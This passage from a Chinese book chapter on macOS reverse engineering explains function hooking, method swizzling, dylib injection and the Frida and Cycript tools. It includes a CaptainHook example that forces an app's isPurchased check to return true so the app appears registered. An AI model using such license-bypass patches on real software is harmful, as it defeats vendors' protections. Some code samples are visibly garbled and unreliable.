对nl_symbol_ptr与_la_symbol_ptr节区执行perform_rebinding_with_section()，后者会相应的符号，比较符号名，并进行符号地址替换。

下面的代码同样可以实现上一节中对系统open()、read()、write()这3个函数的Hook。

//symboltablehook.c
#import <dlfcn.h>

#import <stdarg.h>
#import <stdio.h>
#import <stdlib.h>
#import <unistd.h>
#import <stdint.h>
#import <fcntl.h>
#import <string.h>

#import "fishhook.h"

static int (*orig_open)(const char *, int, ...);
static ssize_t (*orig_read)(int, void *, size_t);
static int (*orig_close)(int);

int my_open(const char *path, int oflag, ...) {
    va_list ap = {0};
    mode_t mode = 0;

    if ((oflag & 0_CREAT) != 0) {
        // mode only applies to 0_CREAT
        va_start(ap, oflag);
        mode = va_arg(ap, int);
        va_end(ap);
        printf("Calling real open('%s', %d, %d)\n", path, oflag, mode);
        return orig_open(path, oflag, mode);
    } else {
        printf("Calling real open('%s', %d)\n", path, oflag);
        return orig_open(path, oflag, mode);
    }
}

ssize_t my_read(int fd, void *buf, size_t sz) {
    printf("Calling real read(%d)\n", fd);
    ssize_t sz_ = orig_read(fd, buf, sz);
    if (sz == sz) {
        memset(buf, 97, sz);
    }
    return sz;
}

int my_close(int fd) {
    printf("Calling real close(%d)\n", fd);
    return orig_close(fd);
}

int main(int argc, char *argv[]) {
    rebind_symbols((struct rebinding[3]) {
        {
            "open", my_open, (void *)&orig_open},
            {"read", my_read, (void *)&orig_read},
            {"close", my_close, (void *)&orig_close}
        }, 3);
    }
}

int fd = open(argv[0], O_RDONLY);
uint32_t magic_number = 0;
read(fd, (void*)&magic_number, 4);
printf("Mach-O Magic Number: %x\n", magic_number);
close(fd);
return 0;
}

执行以下命令，编译并运行查看输出结果：

$ cc fishhook.c main.c -o ./symboltablehook
$./symboltablehook
Calling real open('./symboltablehook', 0)
Calling real read(3)
Mach-O Magic Number: 61616161
Calling real close(3)
执行效果与上一节是一样的。

#### 9.4.3 Inline Hook

Inline Hook是Windows平台上最常见的Hook技术方案之一，通过修改目标函数的汇编指令，跳转执行用户实现的自定义函数，执行完毕后根据实现需求跳转回原地址执行。下面我们看一个最简单的Inline Hook的实现代码：

unsigned char inline_hook_code[] = {
    0x48, 0xB8, 0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, //movabsq 0x1122334455667788, %rax
    0xff, 0xe0,     //jmp *%rax
    0xc3 // ret
};

int inline_hook(void *dst_fun, void *new_fun) {
    *(uint64_t*) (inline_hook_code+2) = (uint64_t) new_fun;
    return writeMemory(dst_fun, inline_hook_code, 13);
}

Hook替换方法功能核心的代码只有一条汇编指令。首先将要执行的自定义函数地址放入rax寄存器，然后jmp跳转去执行，最后使用ret返回。调用起来也简单，代码如下：

void mymain(){
    printf("Oh!!!\\n");
}

void yourcode(int pid, uint64_t basicaddress) {
    printf("Hello world!\\n");
    void *entrypoint = (void*) (basicaddress + 0x4ca04);
    inline_hook(entrypoint, mymain);
}

本节Inline Hook功能的演示来源于开源的补丁工具OsxAppPatcher $ ^{①} $，有兴趣的读者可以阅读它的源代码，掌握具体的使用方法。

#### 9.4.4 Method Swizzing

Method Swizzing直译为方法欺骗。这种Hook方式基于Objective-C运行时库的动态特性。调用一个方法Objective-C，本质上是向对象发送一个消息，查找消息依赖于方法的名字。Objective-C提供了一组底层的API，允许开发人员添加、修改、交换类的方法、变量、协议、属性，具体如下所示。

□ class_addMethod。为类添加一个方法。

☐ method_setImplementation。为一个方法设置实现。

□ class_replaceMethod。替换类的方法。如果原方法不存在，相当于调用class_addMethod；如果存在，相当于调用method_setImplementation。

□ class_addProtocol。为类添加协议。

□ class_addProperty。为类添加属性。

☐ method_getImplementation。获取方法的实现。

☐ method_exchangeImplementations。交换两个方法的实现。

Objective-C中的方法使用selector来表示，方法实现使用IMP来表示。使用这些底层的API，可以实现在运行时偷换selector对应的IMP，达到Hook方法的目的。

Method Swizzing主要用于动态库与框架，在有Objective-C类声明却不能直接修改类的源代码的情况下对类进行扩展。本节的myframeworkswizzing程序将通过扩展第4章的myframework框架，修改[mylib hello]方法的内容，展示Method Swizzing的使用。核心代码如下：

//mylib-swizzing.m
#import <Foundation/Foundation.h>
#import <object/runtime.h>
#import "mylib-swizzing.h"

@implementation mylib (swizzling)

+ (void)load {
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        Class class = [self class];
    }
    SEL originalSelector = @selector(hello);
    SEL swizzledSelector = @selector(myhello);

    Method originalMethod = class_getInstanceMethod(class, originalSelector);
    Method swizzledMethod = class_getInstanceMethod(class, swizzledSelector);
}

   </div>

method_exchangeImplementations(originalMethod, swizzledMethod);
});
- (void) myhello {
    [self myhello];
    NSLog(@"hello method swizzing.");
}
@end

首先，使用class_getInstanceMethod()分别获得hello()与myhello()方法的IMP，然后调用method_exchangeImplementations()交换它们的方法。注意myhello()的实现，第一句调用的是[self myhello]；在方法交换后调用的是原来的[self hello]；因此不会发生死循环。最后，运行程序，输出如下：

2016-06-03 18:57:33.275 myframeworkswizzing[55210:1210685] hello world
2016-06-03 18:57:33.275 myframeworkswizzing[55210:1210685] hello method swizzing.

Swift语言底层也是调用Objective-C的运行时API来发送消息，因此，也可以使用上面的API来完成Swift程序的Method Swizzing，代码片段如下：

import myframeworkswift

extension mylib {
    override public static func initialize() {
        struct Static {
            static var token: dispatch_once_t = 0;
        }
        dispatch_once(&Static.token) {
            let originalSelector = #selector(mylib.hello)
            let swizzledSelector = #selector(mylib.myhello)
            let originalMethod = class_getInstanceMethod(self, originalSelector)
            let swizzledMethod = class_getInstanceMethod(self, swizzledSelector)
            method_exchangeImplementations(originalMethod, swizzledMethod)
        }
    }

    dynamic func myhello() {
        self.myhello()
        NSLog("hello swift method swizzing.");
    }
}

Objective-C语言的Method Swizzing在实现上代码不多，但此处演示的功能是非常有限的，实

际使用这种技术做Hook时可以选择工程级的Hook库,比如ZKSwizzle $ ^{①} $,这是一款功能强大的Hook库,使用方法就请读者自行探索吧。

Swift程序的Method Swizzing需要注意以下两点。

☐ 需要Hook的方法所在的类必须继承自NSObject，因为只有NSObject的子类才能接收消息。

需要Hook的方法必须具有dynamic属性，否则，method_exchangeImplementations()的调用就会失败。当初调试演示程序时，就是因为没有加上dynamic，才导致测试始终不成功。至于为什么要加上dynamic关键字，别问我，这是苹果规定的。

编译并运行演示程序myframeworkswiftswizzing，结果如下：

2016-06-03 19:07:48.865 myframeworkswiftswizzing[55585:1224956] hello world
2016-06-03 19:07:48.865 myframeworkswiftswizzing[55585:1224956] hello swift method swizzing.

Method Swizzing用的是Objective-C运行时库的API都是苹果公司开源的，可以到http://opensource.apple.com/source/objc4/下载查看源代码来了解它的工作原理。下面我们只看method_exchangeImplementations()的代码，如下所示：

void method_exchangeImplementations(Method m1, Method m2)
{
    if (!m1 || !m2) return;
    rwlock_writer_t lock(runtimeLock); //操作需要加锁

    if (ignoreSelector(m1->name) || ignoreSelector(m2->name)) {
        m1->imp = (IMP) & objc_ignored_method;
        m2->imp = (IMP) & objc_ignored_method;
        return; //对于retain、release这样的方法要直接忽略，然后将它们设置成_objc_ignored_method并返回
    }

    //交换IMP，实现是交换指针地址
    IMP m1_imp = m1->imp;
    m1->imp = m2->imp;
    m2->imp = m1_imp;

    flushCaches(nil); //刷新缓存

    updateCustomRR_AWZ(nil, m1); //更新不同类型方法（RR类型或AWZ类型）的标志值
    updateCustomRR_AWZ(nil, m2);
}

static void flushCaches(Class cls)
{
    runtimeLock.assertWriting();

    mutex_locker_t lock(cacheUpdateLock);

    if (cls) {
        .....
    }
}

   </div>

else { //走这里
    Class c;
    NXHashTable *classes = realizedClasses(); //没有Meta数据的类列表
    NXHashState state = NXInitHashState(classes); //遍历类
    while (NXNextHashState(classes, &state, (void **)&c)) {
        cache_erase_nolock(c); //清空缓存，不收缩缓存的大小
    }
    classes = realizedMetaclasses(); //有Meta数据的类列表
    state = NXInitHashState(classes); //遍历类
    while (NXNextHashState(classes, &state, (void **)&c)) {
        cache_erase_nolock(c); //清空缓存，不收缩缓存的大小
    }
}

交换IMP指针后，需要刷新一下缓存，flushCaches()会将所有类的缓存清空一次。该动作有点慢，在不知道IMP对应的类的情况下，这是没有办法的事。最后，调用updateCustomRR_AWZ()更新一些标志位，对于Method Swizzing来说，该方法没什么影响。

### 9.5 代码注入

代码注入（Code Injection）是将外部程序代码（通常是动态库）通过静态或动态方式注入到目标文件或程序中的一种技术，也是目前计算机病毒使用比较频繁的一种技术。静态注入会修改目标程序，将需要执行的代码插入到程序中，是一种侵入式的注入技术；动态注入与之相反，它是在运行时注入代码到目标进程中，进行远程修改的方式，是一种非侵入式的注入。

#### 9.5.1 静态注入

静态注入的一大作用就是对Mach-O文件进行补丁操作。当目标程序中要补丁的汇编代码太多，而目标程序中又找不到空闲地址时，可以将要补丁的代码在一个新的动态库中作为函数实现，然后将其静态注入到目标程序中，最后修改目标程序，跳转到注入的动态库中去执行。

说到静态注入，首先想到的是在Mach-O程序中添加一个LC_LOAD_DYLIB加载命令，然后修正Mach-O头部的加载命令个数与大小的字段。该功能可以自己写代码来实现，不过网上已经有这样的开源工具可以直接使用了，前面介绍的optool就可以做到。

首先编写插入的dylib代码如下：

#import "stdio.h"
attribute((constructor))
void hook_init()
{
    printf("hook init!\\n");
}

这段代码的含义是，当动态库被加载时，输出信息“hello init!”。编译生成libinsertlib.dylib

后，以第6章的crackme演示程序为例，执行如下命令就可以将它插入到程序中了。

$ optool install -p libinsertlib.dylib -c load -t crackme.app/Contents/MacOS/crackme -o crackme.app/Contents/MacOS/crackme_patched
Found thin header...
Inserting a LC_LOAD_DYLIB command for architecture: x86_64
Successfully inserted a LC_LOAD_DYLIB command for x86_64
Writing executable to crackme.app/Contents/MacOS/crackme_patched...

使用optool静态注入生成的文件没有可执行权限，在运行之前，需要执行chmod a+x给它加上可执行权限。注入成功后，执行以下命令运行测试：

$ chmod a+x crackme.app/Contents/MacOS/crackme_patched
$ DYLD_LIBRARY_PATH=~/Desktop crackme.app/Contents/MacOS/crackme_patched
hook init!

除了使用optool外，还可以使用专门的Mach-O静态注入工具insert_dylib $ ^{①} $。执行如下命令就可以完成静态注入：

$ insert_dylib libinsertlib.dylib crackme.app/Contents/MacOS/crackme
LC_CODE_SIGNATURE load command found. Remove it? [y/n] y
Added LC_LOAD_DYLIB to crackme.app/Contents/MacOS/crackme_patched
$ DYLD_LIBRARY_PATH=~/Desktop crackme.app/Contents/MacOS/crackme_patched
hook init!

运行注册后的文件，测试运行成功！

在插入动态库时，会涉及一个动态库加载路径的问题。上面执行optool与insert_dylib插入动态库时，只是指明了动态库的名称，而没有指明路径。在这种情况下，动态链接器在加载MachO查找动态库时，会到DYLD_LIBRARY_PATH指定的路径去查找库。如果没有找到，会到当前执行目录与系统库目录中去查找。如果查找失败的话，会抛出动态库加载异常。当然，可以在插入动态库时指定动态库的完整路径，如/usr/local/lib/libinsertlib.dylib，但这样做的话，需要将libinsertlib.dylib文件复制到/usr/local/lib目录下，而且将软件复制到其他电脑上运行时，也需要做这样的操作，这样显得比较麻烦。

为了更方便地管理动态库的加载路径, 系统允许指定以下3种特殊路径的方式来搜索动态库。

# 1. @executable_path

这种方式适合将动态库绑定到程序中。如crackme安装在/Applications目录，即程序的安装目录是/Applications/crackme.app，动态库的搜索路径则是/Applications/crackme.app/Contents/MacOS目录，动态库libinsertlib.dylib与crackme_patched位于同一目录下。

# 2. @loader_path

macOS 10.4之后加入了@loader_path，主要用来解决各个框架与插件依赖的动态库加载的问

题。@loader_path指定的路径是当前加载的MachO二进制的所在路径，对于可执行程序的主程序来说，它与@executable_path没有区别，都指向可执行程序所在目录；对于插件来说，它通常会被多个程序与框架调用。如果它依赖一个动态库，那么该如何搜索找到该动态库呢？这通常需要与动态库的安装路径INSTALL_PATH配合工作。INSTALL_PATH指的是动态库的安装路径，简单地讲，每个dylib动态库都会有一个LC_ID_DYLIB加载命令，INSTALL_PATH就是该加载命令中name字段指向的dylib路径。动态链接器在找加载动态库时，会通过该路径来加载动态库。比如一个插件程序crackme.plugin，它的插件程序是crackme.plugin/Contents/MacOS/crackme，依赖crackme.plugin/Contents/Frameworks/libinsertlib.dylib，那么可以将libinsertlib.dylib的INSTALL_PATH设置为@loader_path/../Frameworks。这样无论插件放到哪个目录，libinsertlib.dylib都会被正确地加载。修改动态库的INSTALL_PATH可以借助工具install_name_tool来完成，只需要在命令行执行install_name_tool -change /usr/local/lib/libinsertlib.dylib @loader_path/../Frameworks/libinsertlib.dylib ./libinsertlib.dylib即可。

# 3. @rpath

@rpath是由macOS 10.5引入的新特性。想象一下，如果libinsertlib.dylib被插件crackme.plugin依赖，存放的路径为crackme.plugin/Contents/Frameworks/libinsertlib.dylib，同时还被crackme.app依赖，存放的路径为crackme.app/Contents/dylib/libinsertlib.dylib，在这种情况下，libinsertlib.dylib的INSTALL_PATH设置成@loader_path/../dylib或@loader_path/../Frameworks都只能满足其中一个的需求。@rpath的引入就是为了解决这种问题的。@rpath与前面两个路径不同，它不指定具体的一个路径，而是指定多个路径的一个列表。在动态库的MachO文件中，使用LC_RPATH加载命令表示每一个rpath。在本例中，将libinsertlib.dylib的INSTALL_PATH设置成@rpath，然后为crackme.plugin插件添加一项@rpath，值为@loader_path/../Frameworks，为crackme.app添加一项@rpath，值为@loader_path/../dylib，这样libinsertlib.dylib就顺利地解决了加载问题。@rpath可以在开发时在Xcode中设置，也可以编译好程序后，使用install_name_tool工具传入-rpath选项进行修改。可以使用otool工具，查看它们的LC_RPATH信息，如笔者机器上安装的Qt Creator，输出如下：

$ otool -l /Users/macbook/Qt5.7.0/Qt\ Creator.app/Contents/MacOS/Qt\ Creator

Load command 27

cmd LC_RPATH

cmdsize 32

path @loader_path/../ (offset 12)

Load command 28

cmd LC_RPATH

cmdsize 40

path @executable_path/../ (offset 12)

Load command 31

cmd LC_RPATH

cmdsize 40

path @loader_path/../Frameworks (offset 12)

Load command 32
cmd LC_CODE_SIGNATURE
cmdsize 16
dataoff 107904
datasize 9872

可以看到，Qt Creator包含了3条@rpath，这样设置后，主程序的上一级目录与上一级目录下的Frameworks目录都加入了@rpath。再来看看程序PlugIns目录下动态库的INSTALL_PATH路径的设置，以libTaskList.dylib为例，输出如下：

$ otool -l Qt\ Creator.app/Contents/Plugins/libTaskList.dylib | grep LC_ID_DYLIB -A 2
cmd LC_ID_DYLIB
cmdsize 64
name @rpath/PlugIns/libTaskList.dylib (offset 24)

可以看到，它的 INSTALL_PATH 被设置成了 @rpath/PlugIns/libTaskList.dylib，@rpath 根据 Qt Creator 第一条 LC_RPATH 得到值为 @loader_path/../，因此，Qt Creator 在启动时通过 @loader_path/../PlugIns/libTaskList.dylib 就能正确地搜索到动态库并正确加载了。

#### 9.5.2 动态注入

与静态注入相对的技术是动态注入。在一些情况下，静态注入技术不再适用。可执行文件的加密与反调试很严格，代码是通过动态解密的，在这种情况下，代码中内存是解密了的，可以通过动态注入来达到代码的动态补丁效果；另外，程序是长时间运行在内存中的，由于一些原因，不允许执行静态注入，相对来说，动态注入是一种更加稳妥的方案。

动态注入的技术原理是，首先通过task_for_pid()获取指定进程的任务信息，接着需要调用vm_protect()更改远程进程的地址空间为可读可写可执行，完成后就可以调用vm_read()与vm_write()对远程进程进行读写操作了。将需要注入的代码（通常是一段加载动态库的代码）写入目标进程，跳转执行就可以了。目前网上开源的动态注入工具osxinj $ ^{①} $可以完成该工作。osxinj的源代码中包含了工具与演示程序的源代码，下载编译后可以运行，执行以下命令测试效果：

$./testapp &
[1] 40854

testapp reporting in!
$ sudo ./osxinj 40854 ./testdylib.dylib
/Users/macbook/Desktop/Debug/testdylib.dylib

module: 0x7AE0A4D0

bootstrapfn: 0x25FD00

$ lsof -p 40854.

COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME
bash 40854 macbook cwd DIR 1,4 204 29695795 /Users/macbook/Desktop
bash 40854 macbook txt REG 1,4 628496 13911427 /bin/bash
bash 40854 macbook txt REG 1,4 36368 29539862 /Users/macbook/Desktop/testdylib.dylib

   </div>

bash 40854 macbook txt REG 1,4 639664 29041477 /usr/lib/dyld
bash 40854 macbook txt REG 1,4 558172062 29056180
/private/var/run/diagnostic/dyld_shared_cache_x86_64h
bash 40854 macbook Ou CHR 16,1 Ot107633 1261 /dev/ttys001
bash 40854 macbook 1u CHR 16,1 Ot107633 1261 /dev/ttys001
bash 40854 macbook 2u CHR 16,1 Ot107633 1261 /dev/ttys001
bash 40854 macbook 255u CHR 16,1 Ot107633 1261 /dev/ttys001

从Isof命令的输出可以看出，testdylib.dylib已经注入到testapp程序中了。

注意，动态注入使用到了task_for_pid()，因此，使用该技术前需要关闭Rootless，而且，这种技术对系统限制的进程是不起作用的。

#### 9.5.3 Hook 与注入框架

在对程序实施逆向分析期间，Hook与注入技术一般需要配合使用，此时对于分析工作而言，一个强大的Hook与注入框架是十分重要的，依赖框架提供的对外接口，可以方便快捷地做出Hook插件来辅助分析。iOS平台鼎鼎大名的有Mobile Substrate框架，它同时支持代码Hook与代码注入，既可以用它Hook程序中的方法，应用于非越狱环境，也可以用它来做系统级别的注入工具的运行基础平台，iOS平台的逆向分析与越狱工作插件的开发几乎离不开它，但遗憾的是，Mobile Substrate的作者并没有提供对macOS平台的支持。在工具的选择上，只有另寻他法。所幸以下几款Hook与注入的框架可以在macOS上很好地工作。

# 1. CaptainHook

这是一款轻量级的Hook框架，不支持注入功能，一般使用它开发注入库，然后配合静态注入工具使用，可以理解为它是一款优秀的“注入伴侣”。CaptainHook库的Hook实现的代码全部使用宏开发，Hook功能全部位于单独的头文件“CaptainHook.h”当中，在实际进行Hook时，只需要将该头文件包含到项目中即可。该框架使用比较简单，Hook使用CHMethodX()与CHClassMethodX()系列的方法，其中X是数字，表示Hook的方法有多少个参数。以下是Hook代码片段：

#import <Foundation/Foundation.h>
#import "CaptainHook.h"

CHDeclareClass(ibxxxWindowController)

//@interface ibxxxWindowController : NSWindowController <ituXXX>
//- (BOOL)isPurchased:(id)arg1;

//宏格式：参数的个数，返回值的类型，类的名称，selector的名称，selector的类型，selector对应的参数的变量名
CHMethod(1, BOOL, ibxxxWindowController, isPurchased, id, arg1) {
    NSLog(@"patched");
    return TRUE;
}
_attribute_((constructor)) static void entry() {

NSLog(@"hooked");
CHLoadLateClass(ibxxxWindowController);
CHClassHook(1, ibxxxWindowController, isPurchased);
}

这段代码Hook了ibxxxWindowController类的isPurchased()方法，让它永远返回true，也就是欺骗程序已经注册过了。CHMethod()定义的方法需要在代码中显示初始化与注册。在编写Hook工具时，通常是编写动态库，为动态库定义初始化方法，让库在加载时运行指定的代码。方法是将需要执行的方法前加入___attribute__((constructor))声明。本实例的 `entry()` 就是这样一个方法，在初始化部分调用CHLoadLateClass()定位要Hook的类，接着调用CHClassHook()对该类进行Hook，代码在执行时就会自动调用CHMethod()定义的函数。接下来就剩下测试了，将该库静态注入到原程序中，运行查看效果。如下所示，程序就破解成功了：

ixxx_src.app/Contents/MacOS/ixxx; exit;
2016-11-14 11:58:00.455 ixxx[16437:3081964] hooked
2016-11-14 11:58:00.811 ixxx[16437:3081964] patched

这种Hook配合静态注入的分析方法在实际分析过程中经常使用。

# 2. Frida

Frida是一款跨平台的程序注入框架，支持在Windows、macOS、Linux、iOS、Android等多个主流的操作系统上运行，支持向目标程序中注入JavaScript代码。同时它也是高度可移植的，支持不同系统上不同语言的绑定，最新的Frida可以使用Swift、C#、C等多种语言来编写注入脚本。

在macOS上安装Frida很简单，只需要在命令行执行以下代码：

$ python -m pip install frida
or
$ npm install frida

pip方式安装基于Python绑定，npm方式安装基于Node.js绑定。下面我们就以pip方式为例。安装完成后，输出如下：

$ python -m pip install frida
Collecting frida
Downloading frida-8.1.12.zip
Requirement already satisfied: colorama>=0.2.7 in /Library/Python/2.7/site-packages (from frida)
Requirement already satisfied: prompt-toolkit>=0.57 in /Library/Python/2.7/site-packages (from frida)
Requirement already satisfied: pygments>=2.0.2 in /Library/Python/2.7/site-packages (from frida)
Requirement already satisfied: six>=1.9.0 in /Library/Python/2.7/site-packages (from prompt-toolkit>=0.57->frida)
Requirement already satisfied: wcwidth in /Library/Python/2.7/site-packages (from prompt-toolkit>=0.57->frida)
Installing collected packages: frida
Running setup.py install for frida ... done
Successfully installed frida-8.1.12
$ ls -l /usr/local/bin/frida*
-rwxr-xr-x 1 root admin 294 Nov 14 09:32 /usr/local/bin/frida
-rwxr-xr-x 1 root admin 312 Nov 14 09:32 /usr/local/bin/frida-discover

-rwxr-xr-x 1 root admin 316 Nov 14 09:32 /usr/local/bin/frida-ls-devices
-rwxr-xr-x 1 root admin 300 Nov 14 09:32 /usr/local/bin/frida-ps
-rwxr-xr-x 1 root admin 306 Nov 14 09:32 /usr/local/bin/frida-trace
$ cat /usr/local/bin/frida
#!/usr/bin/python
# EASY-INSTALL-ENTRY-SCRIPT: 'frida==8.1.12', 'console_scripts', 'frida'
_requires_ = 'frida==8.1.12'
import sys
from pkg_resources import load_entry_point

if __name__ == 'main':
    sys.exit(
        load_entry_point('frida==8.1.12', 'console_scripts', 'frida')()
)

安装完成后，会在/usr/local/bin目录下安装5个Frida相关的Python脚本。

# 1. frida

Frida的命令行交互工具，支持命令行模式下的进程注入与相关的内容访问。以一个名为guitest.app的程序为例，在程序运行的状态下，执行以下命令可以到注入进程中：

$ frida guitest

/Frida 8.1.12 - A world-class dynamic instrumentation framework
/Commands:
/help -> Displays the help system
object? -> Display information about 'object'
exit/quit -> Exit
More info at http://www.frida.re/docs/home/

[Local::ProcName::guitest] ->

注入成功后，会简单显示进入交互状态，等待用户输入命令。在输入任何命令后，可以按键盘tab键让Frida弹出候选命令菜单，如图9-25所示。

 </div>

执行ObjC开头的方法，可以访问Objective-C运行时所有的类，如下所示：

[Local::ProcName::guitest]-> ObjC.classes.NSApplication
{
    "handle": "0x7fff7a095468"
}
[Local::ProcName::guitest]-> ObjC.classes.NSApplication.sharedApplication()
{
    "handle": "0x7f82f960a7b0"
}
[Local::ProcName::guitest]-> ObjC.classes.NSApplication.sharedApplication().windows()
{
    "handle": "0x7f82f9700fb0"
}
[Local::ProcName::guitest]-> ObjC.classes.NSApplication.sharedApplication().windows().firstObject()
{
    "handle": "0x7f82f9607800"
}
[Local::ProcName::guitest]-> ObjC.classes.NSApplication.sharedApplication().windows().firstObject().contentView()
{
    "handle": "0x7f82f9421240"
}
[Local::ProcName::guitest]-> ObjC.classes.NSApplication.sharedApplication().windows().firstObject().contentView().subviews()
{
    "handle": "0x7f82f942ed10"
}
[Local::ProcName::guitest]-> ObjC.classes.NSApplication.sharedApplication().windows().firstObject().contentView().subviews().co
unt()
"g"
[Local::ProcName::guitest]-> ObjC.classes.NSApplication.sharedApplication().windows().firstObject().contentView().subviews().objectAtIndex_3)
{
    "handle": "0x7f82f9428150"
}

# 2. frida-discover

frida-discover用来通过Hook注入目标程序，发现类中的内部方法，之后方便frida-trace命令使用。执行效果如下：

$ frida-discover QQ
Tracing 19 threads. Press ENTER to stop.

Stopping...

# 3. frida-ls-devices

frida-ls-devices列出连接到电脑上的设备。笔者将iPhone5s连上电脑后，运行命令输出如下：

$ frida-ls-devices

Type Name

local
14dcb7de81xxxx
tcp
local
tether
remote
Local System
iPhone
Local TCP

# 4. frida-ps

frida-ps列举本机与连接到电脑上手机的进程ID与进程名。直接执行输出如下：

$ frida-ps
PID Name
3845 1Password 6
1210 1Password mini
1221 AirPlayUIAgent
1234 Alfred 2
80050 App Store
80051 App Store Web Content
28821 BezelUIServer
92594 Calculator
1122 CheatSheet

执行以下命令可以查看手机上正在运行的程序：

$ frida-ps -Ua
PID Name Identifier
1865 Cydia com.saurik.Cydia
1355 QQ com.tencent.mqq
1413 信息 com.apple.MobileSMS
1534 设置 com.apple.Preferences
1357 邮件 com.apple.mobilemail

# 5. frida-trace

frida-trace功能很强大，可以动态跟踪程序的函数调用。比如要Hook跟踪QQ程序接收数据的recv()方法，可以执行以下命令：

$ frida-trace -i "recv*" QQ

Instrumenting functions...

recv_data: Loaded handler at "/Users/macbook/_handlers_/RTP_RTCP/recv_data.js"
recvmsg$NOCANCEL$UNIX2003: Loaded handler at
"/Users/macbook/_handlers_/libsystem_kernel.dylib/recvmsg_NOCANCEL_UNIX2003.js"
recv$UNIX2003: Loaded handler at "/Users/macbook/_holders_/libsystem_c.dylib/recv_UNIX2003.js"
recvmsg$UNIX2003: Loaded handler at
"/Users/macbook/_handlers_/libsystem_kernel.dylib/recvmsg_UNIX2003.js"
recvfrom: Loaded handler at "/Users/macbook/_handlers_/libsystem_kernel.dylib/recvfrom.js"
recvfrom$NOCANCEL$UNIX2003: Loaded handler at
"/Users/macbook/_handlers_/libsystem_kernel.dylib/recvfrom_NOCANCEL_UNIX2003.js"
recvmsg_x: Loaded handler at "/Users/macbook/_handlers_/libsystem_kernel.dylib/recvmsg_x.js"
recvmsg: Loaded handler at "/Users/macbook/_handlers_/libsystem_kernel.dylib/recvmsg.js"
recv: Loaded handler at "/Users/macbook/_handlers_/libsystem_c.dylib/recv.js"
recv$NOCANCEL$UNIX2003: Loaded handler at
"/Users/macbook/_handlers_/libsystem_c.dylib/recv_NOCANCEL_UNIX2003.js"

/Users/macbook/_handlers_/libsystem_kernel.dylib/recvfrom_UNIX2003.js"
Started tracing 11 functions. Press Ctrl+C to stop.
/* TID 0x1607 */
2909 ms  recvfrom$UNIX2003()
/* TID 0xC30b */
2910 ms  recv$UNIX2003()
2910 ms  | recvfrom$UNIX2003()
/* TID 0x1607 */
14257 ms  recvfrom$UNIX2003()
/* TID 0xC30b */
14258 ms  recv$UNIX2003()
14258 ms  | recvfrom$UNIX2003()
/* TID 0x1607 */
28579 ms  recvfrom$UNIX2003()
/* TID 0xC30b */
28580 ms  recv$UNIX2003()
28580 ms  | recvfrom$UNIX2003()
/* TID 0x1607 */
28613 ms  recvfrom$UNIX2003()

命令执行后，会在当前目录生成一个___目录，该目录下会自动生成一系列的js文件，每个文件都是frida-trace根据指定要Hook的方法生成的Hook点列表，每个文件的大致内容如下：

// _handlers_ /libsystem_kernel.dylib/recvfrom.js
{
    onEnter: function (log, args, state) {
        log("recvfrom(" + "" + "));
    },
    onLeave: function (log, retval, state) {
        }
    }
}

每个js文件包含一个onEnter()与onLeave()方法，前者是被Hook的方法在执行前执行的代码，后者是方法执行返回时执行的代码，默认情况下，onEnter()的内容只是一句输出，内容就是当前Hook的方法名，onLeave()的方法内容默认为空。在确定要Hook的方法后，修改这两个方法的内容，比如根据它们的参数类型输出它们的内容。如上面的输出所示，QQ程序中运行时，接收数据使用的方法名是recv$UNIX2003()，它位于_handlers_/libsystem_kernel.dylib/recvfrom_UNIX2003.js，接下来的分析工作就是修改js文件，再次运行frida-trace -i "recv*" QQ查看结果。

除了这种Hook方式外，Frida还支持直接编写脚本来完成Hook工作，针对不同的语言绑定，可以编写不同的语言脚本来完成。使用Python绑定可以编写py脚本，如下代码片段所示：

import sys
import frida

session = frida.attach("QQ")
scr = ""

Interceptor.attach(Module.findExportByName("libxxx.dylib", "xxx"), {

onEnter: function(args) {
    log("xxx hooked.\n");
},
onLeave: function(retval) {
}
});
script = session.create_script(scr)
def on_message(message, data):
    print message
script.on("message", on_message)
script.load()
sys.stdin.read()

这种便捷且高度可配置的Hook方法，在快速逆向确定分析点的情况下，是非常有用的。

# 3. Cycript

Cycript在iOS逆向界几乎无人不知，它是一款同时支持iOS/macOS平台动态运行时修改的Hook与注入框架，它几乎可以访问程序进程空间中所有的类与方法，同时支持修改它们的数据与行为，功能十分强大。

Cycript的安装有一些麻烦。首先，对于macOS 10.11以上版本，需要先关闭Rootless，否则Cycript可能无法正常工作。关闭Rootless后，到Cycript官网 $ ^{①} $下载最新版本的Cycript。下载的是一个压缩包，将压缩包里面的cycript命令复制到/usr/bin目录下，将Cycript.lib目录下的所有内容复制到/usr/lib目录下，将Cycript.osx目录下的Cycript.framework框架复制到~/Library/Frameworks/目录下。复制完成后，就安装完成了。之所以需要复制到特定的目录，是因为Cycript注入的目标程序可能是运行于沙盒中的，非沙盒路径下的文件访问可能会造成注入分析时失败。

安装完成后，就可以在终端提示符下运行它了。例如使用Cycript注入正在运行的crackme程序，命令片段如下所示：

$ cycript -p crackme
cy#
cy# var app = [NSApplication sharedApplication]
# "NSApplication: 0x7fd45ab011f0"
cy# var delegate = app.delegate
# "crackme.AppDelegate: 0x7fd458400530"
cy# delegate.edtUserName
# "NSTextField: 0x7fd45842efc0"
cy# [delegate.edtUserName stringValue]
@ "macbook"
cy# app.windows[0].contentView.subviews
@[##<NSTextField: 0x7fd45ab19670",”、##<NSTextField: 0x7fd45842c4b0",”、##<NSButton: 0x7fd45842cd50",”、##<NSButton: 0x7fd45842e9b0",”、##<NSTextField: 0x7fd45842efc0",”、##<NSTextField: 0x7fd45842fdf0",”、##<NSButton: 0x7fd458430370"

以上片段展示了如何使用Cycript遍历程序的控件布局，Cycript同时支持修改它们，片段如下：

cy# app.windows[0].contentView.subviews[1].stringValue = "abc"
"abc"
cy# [delegate setEdtSN:@"aaaaaa"]
cy# [delegate edtSN]
@"aaaaaa"
cy# [delegate setEdtUserName:@"nameaaaaa"]
cy# [delegate edtUserName]
@ "nameaaaaa"
cy# [#0x7f9f69d2fda0 setStringValue:@ "mbb"]
Cycript甚至支持以Objective-C语法的形式调用系统框架中的方法，如下所示：
cy# [[NSFileManager defaultManager] URLsForDirectory:NSDocumentDirectory inDomains:NSUserDomainMask]
@[##file://Users/macbook/Library/Containers/fc.crackme/Data/Documents/"]
cy#

在逆向分析过程中，Cycript是不可多得的利器。有兴趣的读者，去挖掘它的更多功能吧！

### 9.6 补丁&注册机

